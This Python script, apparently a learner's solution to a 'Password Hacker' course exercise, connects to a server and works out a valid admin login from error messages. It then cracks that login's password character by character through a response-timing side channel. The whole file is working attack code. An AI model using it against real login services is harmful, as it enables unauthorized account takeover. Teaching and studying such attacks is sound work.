# write your code here
import sys
import socket
import string
#import itertools
import json
import time


class Hacker:
    def __init__(self, ip, port):
        self.address = (str(ip), int(port))
        self.msg = None
        self.client_socket = socket.socket()
        self.path = '/home/santiago/PycharmProjects/Password Hacker/Password Hacker/task/logins.txt'
        self.admins = None
        self.response = None
        self.admin = None
        self.password = ""
        self.alphabet_numbers = string.ascii_letters + '0123456789'
        self.end = False

    def make_a_connection(self):
        with self.client_socket as s:
            s.connect(self.address)
            with open(self.path, 'r') as f:
                self.admins = f.readlines()
                self.admins = list(map(lambda x: x.strip(), self.admins))
                for admin in self.admins:
                    self.msg = json.dumps({"login": admin, "password": ' '}, indent=4)
                    s.send(self.msg.encode())
                    self.response = json.loads(s.recv(1024).decode())
                    self.response = self.response["result"]
                    if self.response == "Wrong password!":
                        self.admin = admin
                        break
            while not self.end:
                for element in self.alphabet_numbers:
                    start = time.time()
                    self.msg = json.dumps({"login": self.admin, "password": self.password + element}, indent=4)
                    s.send(self.msg.encode())
                    self.response = json.loads(s.recv(1024).decode())
                    self.response = self.response["result"]
                    end = time.time()
                    dif = end - start
                    if dif >= 0.09:
                        self.password = self.password + element

                    if self.response == "Connection success!":
                        self.end = True
                        print(json.loads(json.dumps(self.msg, indent=4)))
                        exit()


if __name__ == '__main__':
    args = sys.argv
    Hacker(args[1], args[2]).make_a_connection()
